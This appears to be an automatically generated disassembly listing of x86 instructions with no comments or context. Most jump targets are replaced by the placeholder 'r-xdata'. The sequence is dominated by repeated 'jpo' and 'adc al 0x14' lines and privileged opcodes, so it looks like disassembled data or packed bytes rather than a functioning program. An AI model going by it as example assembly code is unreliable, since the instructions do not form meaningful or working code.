jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ edx + eax + 0x141439fe ] edi
jpo r-xdata
jpo r-xdata
mov bl 0x81
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb esi [ ebx - 0x66fd317f ]
sbb eax 0x6a7b1414
pop es
jpo r-xdata
bound ebp [ edi - 0x7e4c2a31 ]
jpo r-xdata

jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0x317e4ce5 ]
add eax [ ecx - 0x18 ]
jmp r-xdata
test [ ebp - 0x5430509e ] ecx
mov bl 0x81
jpo r-xdata
sub_46fa5e
pushad
scasb [ edi ]
pop ss
and ch [ eax ]
jpo r-xdata
mov edi 0x7b14143f
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x5a ]
or [ esi + 0xdae628d ] 0x28581b3
adc al 0x14
in al 0x6f
lahf
iretd
jpo r-xdata
mov ah 0x5
adc al 0x14
jpo r-xdata
pushad
and ecx [ ebp - 0x27f0519e ]
sub eax [ edx ]
jpo r-xdata
mov dl 0x8d
bound esp [ esi - 0x72dc9fcb ]
bound ebp [ esi + 0x22bd80f ]
mov [ ebp - 0x4dce599e ] cs
add ebp 0x37a6628d
jpo r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
scasb [ edi ]
out 0xeb al
jmp r-xdata
jpo r-xdata
jpo r-xdata
push ss
mov esp 0x14eb81c7
jl r-xdata
xor [ edx + 0x628dc581 ] esi
cmpsb [ esi ] [ edi ]
aaa
cmpsb [ esi ] [ edi ]
xor esi [ edx + 0x628d8c81 ]
cmpsb [ esi ] [ edi ]
and ch [ esi + 0x2b ]
psubusb mm5 [ ebx ]
add dh [ ebp + eax + 0x7b7b1414 ]
scasb [ edi ]
outsb
jpo r-xdata
jpo r-xdata
pop edi
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
bound ebp [ esi + 0x1150021f ]
adc al 0x14
scasb [ edi ]
add edi [ ebx + 0x14261e02 ]
adc al 0x14
sahf
sbb esp [ edx - 0x4a ]
and edi [ edx + eax + 0x14143ddc ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sbb dh dh
sub [ ebx + 0x143fbf02 ] 0x14
bound esp [ esi - 0x6c7e4dc1 ]
lea esp [ edx - 0x5a ]
cmp eax 0x8d8a81b2
bound esp [ esi - 0x737e4dcd ]
mov ebx 0xebf81e03
jmp r-xdata
adc al 0xae
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

xor [ esp + edx ] edx
jpo r-xdata
pop ds
jge r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db047 ]
mov dh 0x45
sbb [ eax + 0x55a6628d ] 0x29f81b2
bound esp [ edi ]
adc [ esp + edx ] dl
scasb [ edi ]
btc [ edx ] eax
pop ds
add dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc edi 0xffffffe1
jmp r-xdata
outsb
pop esi
xor [ esp + edx ] dl
add al [ ebp + 0x30 ]
xchg edi eax
iretd
bound esi [ esi - 0x72cf27f3 ]
bound esi [ esi + 0x2316003 ]
add al [ edx + 0x22 ]
adc al 0x14
add esi [ edx ]
outsb
outsd
push esi
adc al 0x14
fcom [ edx + edx * 8 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
cwde
jmp r-xdata
jpo r-xdata
add cl bl
add [ esp + edx ] edx
outsb
adc al 0x14
jpo r-xdata
out 0xeb al
jmp r-xdata
sahf
jecxz r-xdata
sti
jmp r-xdata
add eax [ eax + 0x3d ]
adc al 0x14
add dl [ ebp + 0x7b141423 ]
call 0x49300da
xchg edx eax
mov cl 0x8d
bound edi [ esi - 0x4e707e27 ]
adc al 0x14
jpo r-xdata
imul ecx [ edi ] 0x14
adc al 0x7b
lea esp [ edx - 0x42 ]
lds ecx [ ebp - 0x7e24419e ]
adc [ esp + edx ] edx
fsub [ edx ]
jpo r-xdata
in eax dx
add bl [ esi ]
das
adc al 0x14
jpo r-xdata
cmp bh bl
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub esp esp
outsd
int 0x1
adc al 0x14
fsubr [ ebx ]
stosd [ edi ]
lea esp [ edx - 0x42 ]
fild [ ecx + 0xc2a0289 ]
adc al 0x14
jpo r-xdata
bound edi [ esi - 0x419d723b ]
fild [ ecx + 0x628db192 ]
mov esi 0xb18f81d9
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub ah [ edx ]
sub [ ebx + 0x7b ] bh
outsb
sub esp esp
jb r-xdata
jpo r-xdata
adc al 0xbb
adc al 0x9e
aaa
add cl [ eax ]
and al 0x14
in al 0x6e
push ss
stc
jmp r-xdata
add bl [ edi ]
adc al 0x14
jpo r-xdata
add edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
add dl [ eax + 0x1f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub esp esp
outsb
cli
mov esi 0x2ba0760
cmp [ eax ] ah
adc al 0x14
jpo r-xdata
in al 0x72
sub ah [ eax + 0x2a ]
and ch [ eax ]
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
stosd [ edi ]
add ch [ esi + 0x11 ]
adc al 0x14
jpo r-xdata
adc al 0x9e
add eax [ edx ]
adc al 0x14
jpo r-xdata
pushad
xor cl [ ebp + 0x249b662 ]
or al 0x1f
adc al 0x14
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
popad
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
add ch [ ecx + 0x10 ]
adc al 0x14
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jmp r-xdata
jpo r-xdata
xlat
loope r-xdata
jpo r-xdata
pushad
sub eax 0xebf81302
jmp r-xdata
in al 0x68
add al 0x3d
adc al 0x14
pushad
cmpsb [ esi ] [ edi ]
pop ss
push 0xa662ff2a
pop ss
add dh [ 0x7b14142f ]
add esp [ ecx ]
adc dl [ esp + edx ]
mov ebx 0xbb1fae66
scasb [ edi ]
sub eax [ edx ]
add al 0x14
adc al 0x7b
jpo r-xdata
cmp edx [ esi ]
adc al 0x14
mov ebx 0xe61d02b8
jmp r-xdata
outsb
jpo r-xdata

lea esp [ edx - 0x4a ]
or esi [ eax + 0x628ddd81 ]
xchg esi eax
add esi [ ecx + eax * 4 - 0x419d7221 ]
lodsd [ esi ]
out 0x3 eax
xchg edx eax
xor edx [ esp + edx ]
and [ edx - 0x438ac7a0 ] 0x62
lodsd [ esi ]
sti
add eax [ eax + 0x68141433 ]
das
stosd [ edi ]
add cl [ ecx + 0x7b141435 ]
jpo r-xdata
bound ebp [ esi - 0x72d29fc1 ]
bound ebp [ esi - 0x72d79fc3 ]
bound ebp [ esi - 0x72d59fcd ]
bound ebp [ esi + 0x22d6031 ]
push eax
adc dl [ esp + edx ]
lea esp [ edx - 0x1d ]
sub [ ebx + 0x60 ] bh
pop es
mov edx 0x3bcbdb8
jpo r-xdata
sti
add ch [ edx ]
out 0xeb eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
add eax 0x7b14140b
jpo r-xdata
mov dh 0x3
pushad
xor [ edx ] eax
out 0xeb eax
jmp r-xdata
cmp al [ ebx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov bh 0xb8
jpo r-xdata
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x5a ]
add ch [ ebx + 0xf ]
jpo r-xdata
pop ss
add eax [ edi + 0x3 ]
mov bl 0x62
scasb [ edi ]
enter 0x62b3 0xae
jpo r-xdata
jpo r-xdata
fdivr [ 0x7b7b1414 ]
jpo r-xdata
add [ eax ] dh
lea esp [ edx - 0x52 ]
or eax 0x28581b3
mov esp edx
jmp r-xdata
lea esp [ edx - 0x4a ]
pop ecx
add dl [ ecx + edi + 0x14 ]
adc al 0x7b
mov eax 0x2039e14
sub cl [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub ebx 0xffffffeb
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
fsubr [ ebx ]
mov ebp 0x17ae62bc
bound ebp [ esi + 0x13ae621f ]
add dl [ ecx ]
sub [ esp + edx ] edx
xor [ fs : esp + edx ] edx
lea ebp [ esi + 0x1d ]
in al 0x6e
jpo r-xdata
push ebp
mov dl 0x81
lahf
cmpsb [ esi ] [ edi ]
adc al 0x14
add esp [ ecx + 0x11 ]
adc al 0x14
mov dl 0xb2
outsb
push ss
adc al 0x14
bound ebp [ esi + 0x3470317 ]
jpo r-xdata
pushad
sbb eax eax
sbb ch [ eax + 0x2a ]
jmp 0x34159b1
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
pop edi
cmp [ esp + edx ] dl
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec esp
add al 0x14
adc al 0xd0
scasb [ edi ]
out 0xe4 eax
jpo r-xdata
jmp r-xdata
mov ebp 0xfb3a03bb
bound ebp [ esi + 0x6fae6613 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
0xbc14ebeb 0x14e3
push 0x1f83ff2f
outsb
sub esp esp
outsd
jpo r-xdata
mov [ ebx + 0x628d8f81 ] esi
scasb [ edi ]
add esi [ ebx + 0x628d8a81 ]
scasb [ edi ]
add [ ebx + 0x628d8c81 ] esi
scasb [ edi ]
outsb
and edx [ esi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
and [ edx ] eax
xchg esi eax
jpo r-xdata
adc [ ebp + 0x602b9662 ] cl
adc cl [ ebp + 0x60299662 ]
adc eax 0x2f96628d
lea esp [ edx - 0x52 ]
or esi [ ebx + 0x628d8e81 ]
scasb [ edi ]
or [ ebx + 0x628da281 ] esi
scasb [ edi ]
btr [ edx ] eax
neg [ edi ]
adc al 0x14
in al 0x6e
or [ fs : esp + edx ] dl
rcr [ edx ] 0x6f
jpo r-xdata
jmp r-xdata
mov esi 0xbaba0760
add ch [ eax ]
in al 0xeb
jmp r-xdata
adc al 0x14
shr [ esi + 0x1e6fe4e7 ] 0x1
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x1401d302
adc al 0x81
lds esi [ edx - 0x141d63fe ]
jmp r-xdata
inc edi
add edx [ esp + edx ]
jpo r-xdata
and [ esp + edx ] 0x16010214
adc al 0x14
jpo r-xdata
in al 0x6f
pushad
xor [ ebp - 0x7eb4499e ] ecx
cwde
adc al 0xd8
xor [ edx ] al
push 0x34
mov esp 0x14267902
adc al 0x7b
jpo r-xdata
jpo r-xdata
add ch al
sti
jmp r-xdata
in al 0x6f
bound ebp [ esi - 0x3efd4cf9 ]
jpo r-xdata
push 0x1502e72f
xor eax 0x7b7b1414
jpo r-xdata
out dx eax
mov eax 0x6e66b8b8
imul edx [ esi ] 0x14
adc al 0xbb
mov eax 0x14181602
adc al 0x7b
lea esp [ edx - 0x52 ]
aas
pushad
sub eax 0x3dae628d
pushad
sub [ ebp + 0x6033ae62 ] cl
sub cl [ ebp + 0x6031ae62 ]
sub eax 0x14125002
adc al 0x8d
mov bl 0x81
pushfd
lea esp [ edx - 0x52 ]
lar eax [ edi + 0xe ]
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + ecx * 2 - 0x15 ]
jpo r-xdata
jmp r-xdata
adc esp [ esi - 0x52 ]
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x7c141360
jmp r-xdata
adc al 0x14
adc al 0x14
fdiv [ eax ]
add ch [ edx + 0x34 ]
jpo r-xdata
pop es
mov bl 0x2
shl [ ebx ] 0x14
jpo r-xdata
jpo r-xdata
outsb
and al [ edx ]
bound eax [ ebx ]
adc al 0x14
inc eax
cmp eax 0x95021414
and edx [ esp + edx ]
in al 0x5c
[ edx + 0x68549166 ]
adc al 0xf2
in al 0x6c
call 0x6932e9d1
sub ebx ecx
jpo r-xdata
mov eax 0xbcbd2bd8
bound ebp [ esi + 0x1fae6217 ]
bound ebp [ esi + 0x29110213 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
outsd
push ds
outsd
scasb [ edi ]
jpo r-xdata
adc al 0x7b
mov dl 0x8d
bound esi [ esi + 0x39540259 ]
adc al 0x14
jpo r-xdata
outsb
add al 0x24
adc al 0x14
mov ebx 0x2379e14
or [ esp + edx ] ah
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
cmp [ ebp + 0x14379802 ] 0x760be14
push 0x8981db07
mov bl 0x81
lea esp [ edx - 0x6a ]
sub [ eax + 0x15 ] esp
lea esp [ edx - 0x6a ]
das
pushad
pop es
mov edx 0x14d8bcba
mov esp 0x1439d202
adc al 0x7b
in al 0x6f
call 0x7c32eb6c
jpo r-xdata
pop es
aaa
adc al 0x14
lea ebp [ esi + 0x1d ]
add dh [ esi + 0x7b14140f ]
jpo r-xdata
jpo r-xdata
add bh [ ecx + 0x26 ]
adc al 0x14
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
add al cl
jpo r-xdata
add ah [ edx + 0x27 ]
mov dh 0x47
mov al 0x8d
bound esi [ esi - 0x72677ebb ]
bound esp [ esi - 0x607e4dab ]
outsb
sbb eax 0x31646ee4
adc al 0x14
sti
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
pop es
mov edx 0xe42802ba
jmp r-xdata
mov ss [ edx ]
jpo r-xdata
add bh bl
jpo r-xdata
jpo r-xdata
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
adc al 0x2
jpo r-xdata
jpo r-xdata
jpo r-xdata
call 0xffffffffe516cfbe
pop esp
sub edi [ ebx - 0x14fcd2a0 ]
sbb dl [ esp + edx ]
push 0xaf62e72f
iretd
pushad
mov esi 0xbaba0760
mov esp 0x2bc14d8
sar [ ecx ] cl
adc al 0x14
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov ss [ esp + edx + 0x14 ]
add bh [ edx - 0x1e ]
jmp r-xdata
add ecx [ esi + 0x68141412 ]
das
out 0x6e eax
sub esp esp
outsd
adc al 0x14
push 0x2b6ee72f
in al 0x6f
jpo r-xdata
jpo r-xdata
mov eax [ 0x2141407 ]
outsd
rcr bh cl
cli
in al 0x6e
in eax 0xeb
jmp r-xdata
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound edi [ esi - 0x72c59fcd ]
bound edi [ esi - 0x257e4ecf ]
add ah [ ebp + 0x7b141431 ]
bound esp [ esi - 0x519d72b3 ]
mov dl 0x1c
jpo r-xdata
sbb [ esp + edx ] edx
adc al 0x7b
jpo r-xdata
sub esi [ edx - 0x38fdcce4 ]
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ ebx ]
sub edi 0xebdbeb83
jmp r-xdata
jpo r-xdata
scasb [ edi ]
adc edi [ ebx + 0x50022d60 ]
aaa
adc al 0x14
jpo r-xdata
jmp r-xdata
xor eax [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ebp
pushad
and eax 0xebe67702
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
sbb al 0x33
jpo r-xdata
jpo r-xdata
test eax 0x31360bd
jpo r-xdata
sbb eax 0xae661414
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
or ebx 0x33be628d
pushad
cmp cl [ ebp - 0x4ece419e ]
sbb edx 0x1431a502
adc al 0x7b
add al bh
jpo r-xdata
adc al 0x14
mov ebx 0x6083bd14
scasb [ edi ]
out 0xd0 eax
sub [ edx ] al
cdq
jmp r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al 0x3f
pushad
jpo r-xdata
jmp r-xdata
sti
adc al 0x66
jpo r-xdata
jpo r-xdata
outsb
sbb eax 0x31186fe4
jpo r-xdata
adc al 0x7d
inc edi
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
ja r-xdata
outsb
mov dh 0x11
jpo r-xdata
mov eax 0xeb477d14
jmp r-xdata
mov ebx 0x16236e66
jpo r-xdata
mov ebx 0xebe7f903
jmp r-xdata
adc al 0x9e
pop ds
jpo r-xdata
adc al 0x7b
jpo r-xdata
add ebp [ eax + 0x214143f ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
pushad
pop es
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] edx
jpo r-xdata
bound ebp [ esi - 0x62fd4cf5 ]
adc al 0x14
jpo r-xdata
jecxz r-xdata
adc [ esp + edx ] edx
cmp [ edx ] eax
inc ebx
jmp r-xdata
pushad
adc edx [ esp + edi * 2 ]
jpo r-xdata
jpo r-xdata
in al 0x6f
sub esp [ edx ]
adc al 0x14
add dh [ eax - 0x1e ]
jmp r-xdata
add bl [ esi + 0x14ebebeb ]
sahf
pop ss
xor [ esp + edx ] edx
lodsd [ esi ]
mov eax [ ebx ]
fstp [ edi ]
adc al 0x14
adc [ edi - 0x437e7346 ] 0x62
adc al 0x14
aas
jpo r-xdata
add cl [ ebx ]
sub al 0x14
add esp [ eax ]
mov ebx 0xe9ebed83
jpo r-xdata
fsubr [ ebx ]
push 0x6d62f32f
pop ds
jpo r-xdata
jg r-xdata
jpo r-xdata
push 0x2ebe796
adc [ edx ] eax
adc al 0x14
jpo r-xdata
fucomi st6
jpo r-xdata
scasb [ edi ]
jpo r-xdata
out dx eax
jmp r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
add ch [ esi + 0x7b14142e ]
jpo r-xdata
adc al 0xbc
lahf
add bh cl
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
bound edx [ esi + 0x31040205 ]
or ebp [ esp + edx ]
adc al 0x2
jpo r-xdata
in eax dx
jpo r-xdata
jmp r-xdata
adc al 0x68
or edi [ ecx ]
bound ebp [ ebp + 0x1f ]
jpo r-xdata
adc [ ebx - 0x72537e4f ] 0xb171be62
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0x13683c14
0x26f06ee4 0x1414
jpo r-xdata
out 0xeb eax
jpo r-xdata
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
in al dx
jmp r-xdata
mov bl 0x2
jpo r-xdata
cmpsb [ esi ] [ edi ]
dec ebp
pushad
stosd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax 0xbe7b1414
pushad
pop es
push 0x7
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
and [ 0xffffffffae661414 ] bl
jpo r-xdata
jmp 0xffffffffe84c04fa
jpo r-xdata
adc al 0x14
push edi
xor [ eax + 0x56 ] al
or esi [ ebx - 0x141362fe ]
jmp r-xdata
jpo r-xdata
sub ebp 0xffffffeb
jpo r-xdata
add dl [ ecx ]
add dl [ esp + edx ]
pushad
xor al 0x38
adc [ eax + 0x2d ] ch
jecxz r-xdata
adc al 0x7b
jpo r-xdata
popfd
fsubr [ ebx ]
add ch [ ecx + eax + 0x7b7b1414 ]
mov ebp 0xe42b6ea7
jpo r-xdata
adc al 0x7b
lds edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ edx ]
xchg edi eax
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x63 eax
mov ebp 0xa8031360
jpo r-xdata
add al [ 0x7bebebe8 ]
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x60ebebec ]
scasd [ edi ]
iretd
jpo r-xdata
jmp r-xdata
jpo r-xdata
arpl [ edi + 0x15684cfe ] si

jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x135f6e66
jmp r-xdata
outsd
outsb
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
shr [ eax ] 0x1
jpo r-xdata
mov eax 0x142efc02
jpo r-xdata
outsd
push 0x2141422
jpo r-xdata
adc al 0x14
jpo r-xdata
loop r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
mov edi 0xb8ebebe2
mov ebp 0x541b60bc
out dx eax
0x66bcebeb 0x5f6e
inc esp
add eax 0x7b7b1414
adc eax [ ebx ]
jpo r-xdata
mov [ ecx - 0x70529d44 ] es
add dl dl
adc al 0x14
jpo r-xdata
call 0x7bc2edfe
jpo r-xdata
sub eax [ edx ]
jmp r-xdata
jpo r-xdata
arpl bx sp
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
nop
in al 0x6f
jpo r-xdata
adc al 0x14
push cs
mov dh 0x28
jpo r-xdata
mov al 0x60
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
cld
jpo r-xdata
pushad
adc al 0x14
mov ch 0x2
mov eax 0x7bebebeb
jpo r-xdata
jpo r-xdata
mov esi 0x142dc902
adc al 0x7b
mov esi 0x76a0760
jmp r-xdata
popad
cmpsb [ esi ] [ edi ]
jmp r-xdata
cmc
jpo r-xdata
sar [ esi ] cl
mov esp 0x28fad62
jpo r-xdata
cmp [ edx - 0x2dfd7053 ] 0x7b14143e
lea esp [ edx - 0x6a ]
add eax 0x14310402
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
add eax 0x7bebebe8
jpo r-xdata
jpo r-xdata
out 0xeb eax
add esi ebp
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
push 0x2402e929
push esi
jpo r-xdata
sub esp [ esi - 0x4f ]
cmp ebp [ eax + 0x10 ]
jpo r-xdata
mov ss [ ebx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
add ecx [ ebx ]
jpo r-xdata
lea ebp [ esi + 0x2b ]
in al 0x6f
jpo r-xdata
add al [ ebx + ecx ]
bound edi [ esi - 0x617e4e8f ]
bound ebp [ esi - 0x7d7e4ce7 ]
add bh [ ecx + eax + 0x7b7b1414 ]
adc al 0x14
bound ebp [ ebp + 0x3ed2028f ]
lea esp [ edx - 0x52 ]
sbb [ ebx - 0x43fd7d7f ] esi
add [ esp + edx ] edx
jpo r-xdata
lodsd [ esi ]
pop [ edx ]
xchg edi eax
bound edi [ esi - 0x699d728d ]
jpo r-xdata
pop ss
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
adc al 0x14
add edi edi
loope r-xdata
or [ ebp - 0x4ce6519e ] 0x8d
bound ebp [ esi + 0x28e811f ]
or al 0x35
adc al 0x14
jpo r-xdata
adc al 0x14
rol [ ebx ] 0x1
jpo r-xdata
mov cl 0x3b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub ah ah
jpo r-xdata
jpo r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
pushad
adc eax [ ecx + 0x7d14bc8f ]
jpo r-xdata
sub dl [ ds : esp + edx ]
add ch [ eax + 0x5 ]
adc al 0x14
jpo r-xdata
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
add al 0x31
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
jae r-xdata
add al ch
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x14b830d8
outsb
pop edi
adc edx [ esp + edx ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + esi * 8 - 0x1494147d ]
mov al 0x28
jpo r-xdata
jpo r-xdata
jmp r-xdata
lahf
adc [ esp + edx ] dl
mov al 0x28
jpo r-xdata

add ebp [ esi + ebp ]
adc al 0x14
fcomp [ 0xffffffffb6022b6e ]
aaa
adc al 0x14
jpo r-xdata
push 0xd102e210
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
or [ edi + 0x5b7d14bc ] 0xb8ebebeb
add al [ eax + 0x1b ]
adc al 0x14
jpo r-xdata
outsd
in al 0x6e
inc esp
out 0xeb eax
jmp r-xdata
mov edx 0x62bc818c
jpo r-xdata
cmp al 0x68
adc ebp edx
in al 0x6e
bound edx [ esi - 0x6c7e4b81 ]
mov cl 0x81
lodsb [ esi ]
lea esp [ edx - 0x42 ]
jno r-xdata
adc al 0x14
jpo r-xdata
cmp [ ecx + 0x628db38e ] eax
scasb [ edi ]
imul edx [ esi + 0x6ee4eafb ] 0x5d
add dl [ esp + edx ]
mov eax 0x16236e66
adc al 0x14
jpo r-xdata
lodsd [ esi ]
jpo r-xdata
jpo r-xdata
and [ esi ] 0xfffffffa
jmp 0x5049c23d
bound ebp [ ebp + 0x3afe03f7 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
and edx [ esi ]
jpo r-xdata
loop r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dh [ edx ]
sub [ esp + edx ] dl
jpo r-xdata
mov ebx 0xeb037c14
jpo r-xdata
scasb [ edi ]
cmp eax [ edx ]
call 0x7bc2f173
adc al 0xbd
out dx eax
mov esp 0x32d60bb
mov ah 0x37
adc al 0x14
push 0xee02fb2f
loop r-xdata
jpo r-xdata
cmp eax 0x14149c02
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
mov esp 0xeb5b7d14
jmp r-xdata
jpo r-xdata
scasb [ edi ]
cmp esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0xb8
mov ebx 0xebebd502
jmp r-xdata
sbb [ esi + 0x77be628d ] 0x1437e302
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc edx [ esp + edi * 4 ]
mov edi 0x6fe42b6e
or ebx [ esi ]
adc al 0x14
mov eax 0xae66ef81
aaa
mov ebx 0x6013ae60
imul ecx [ edi - 0x15 ] 0xffffffeb
jmp r-xdata
jpo r-xdata
pushad
adc al [ edx ]
stosd [ edi ]
push ebp
adc al 0x14
jpo r-xdata
jmp r-xdata
adc al 0xbb
adc al 0x7c
add ebp ebx
sub al 0xae
pop es
cwde
add edi esi
cmp dl [ esp + edx ]
adc [ edx + 0x14126b02 ] 0x817b7b14
adc al 0x14
jpo r-xdata
xchg esi eax
sti
0x25d6ee4 0x1414
test [ ebx ] 0x14143afe
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jl r-xdata
mov esp 0x206ae62
lds eax [ eax ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x16b76e66
jpo r-xdata
adc al 0x14
pushad
movsd [ edi ] [ esi ]
retn
pop ebx
adc al 0x7d
jpo r-xdata
jpo r-xdata
and esp [ esi + 0x6e ]
imul edx [ esi ] 0x14
adc al 0x2
adc edx [ esp + edx ]
adc al 0x60
jpo r-xdata
adc al 0x14
jpo r-xdata
sub eax [ edx ]
add al 0xb
bound ebp [ ebp + 0x1f ]
mov esp 0xeb2f5562
jmp r-xdata
adc [ edi + 0x30 ] 0x40
push esi
add ch dh
jge r-xdata
mov dl 0xd8
out dx al
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop ss
mov ebx 0xafbd14b8
pushad
scasb [ edi ]
pop ss
add edx [ ecx + 0x66ebebe1 ]
jpo r-xdata
adc eax 0xebeaef83
jmp r-xdata
jpo r-xdata
or [ esi - 0x72787e4d ] 0xb31dae62
or [ ebp + 0x13ae628d ] 0x8dc581b3
bound ebp [ esi + 0x628db311 ]
scasb [ edi ]
cmp esi [ ebx + 0x39ae628d ]
or [ esi - 0x519d724d ] 0x8d2bd83f
bound edi [ esi - 0x519d72db ]
cmp eax 0x1fa6628d
jpo r-xdata
xchg esi eax
xor esp [ esi + 0x66 ]
pop ebx
push ss
adc al 0x14
add esi esi
loope r-xdata
jpo r-xdata
xchg edx eax
add ch [ ebx + 0x12 ]
adc al 0x14
jpo r-xdata
inc ebx
jmp r-xdata
jl r-xdata
mov ebx 0x2efc02b8
jpo r-xdata
push ss
